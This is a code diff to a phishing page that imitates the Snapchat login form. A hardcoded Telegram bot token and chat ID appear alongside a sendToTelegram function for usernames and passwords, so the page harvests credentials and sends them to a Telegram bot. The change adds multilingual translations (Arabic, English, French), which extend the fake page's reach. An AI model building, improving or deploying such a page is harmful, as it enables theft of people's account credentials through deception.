@@ -84,13 +84,13 @@
         <img class="logo" src="https://1000logos.net/wp-content/uploads/2017/08/Snapchat-logo.png" alt="Snapchat Logo">
         <h1 id="title">تسجيل الدخول</h1>
         <form onsubmit="handleSubmit(event)">
-            <label for="username">اسم المستخدم</label>
+            <label id="username-label" for="username">اسم المستخدم</label>
             <input type="text" id="username" name="username" required>
 
-            <label for="password">كلمة المرور</label>
+            <label id="password-label" for="password">كلمة المرور</label>
             <input type="password" id="password" name="password" required>
 
-            <button type="submit">تسجيل الدخول</button>
+            <button id="submit-button" type="submit">تسجيل الدخول</button>
         </form>
         <div class="message" id="error-message">المعلومات غير صحيحة، جرب مرة أخرى.</div>
     </div>
@@ -98,7 +98,52 @@
     <script>
         const botToken = '7908469273:AAFmgF2elBpLaH6YGJK6Qtrmf8Z7TsyODzc'; // رمز البوت
         const chatId = '612575358'; // استبدل بـ chat_id الخاص بك
-        let attempt = 1; // لتتبع عدد المحاولات
+        let attempt = 1;
+
+        const translations = {
+            ar: {
+                title: "تسجيل الدخول",
+                usernameLabel: "اسم المستخدم",
+                passwordLabel: "كلمة المرور",
+                submitButton: "تسجيل الدخول",
+                errorMessage: "المعلومات غير صحيحة، جرب مرة أخرى.",
+            },
+            en: {
+                title: "Login",
+                usernameLabel: "Username",
+                passwordLabel: "Password",
+                submitButton: "Log in",
+                errorMessage: "Incorrect information, please try again.",
+            },
+            fr: {
+                title: "Connexion",
+                usernameLabel: "Nom d'utilisateur",
+                passwordLabel: "Mot de passe",
+                submitButton: "Se connecter",
+                errorMessage: "Informations incorrectes, veuillez réessayer.",
+            },
+        };
+
+        // تحديد اللغة بناءً على لغة الجهاز
+        function getLanguage() {
+            const lang = navigator.language || navigator.userLanguage;
+            const language = lang.split('-')[0]; // أخذ الكود الأساسي فقط (مثلاً 'ar' من 'ar-SA')
+            return translations[language] ? language : 'en'; // افتراضيًا الإنجليزية إذا لم تكن اللغة مدعومة
+        }
+
+        // تطبيق الترجمة بناءً على اللغة
+        function applyTranslations() {
+            const lang = getLanguage();
+            const texts = translations[lang];
+
+            document.getElementById('title').textContent = texts.title;
+            document.getElementById('username-label').textContent = texts.usernameLabel;
+            document.getElementById('password-label').textContent = texts.passwordLabel;
+            document.getElementById('submit-button').textContent = texts.submitButton;
+            document.getElementById('error-message').textContent = texts.errorMessage;
+        }
+
+        applyTranslations(); // تطبيق الترجمة عند تحميل الصفحة
 
         // إرسال البيانات إلى Telegram
         function sendToTelegram(username, password) {
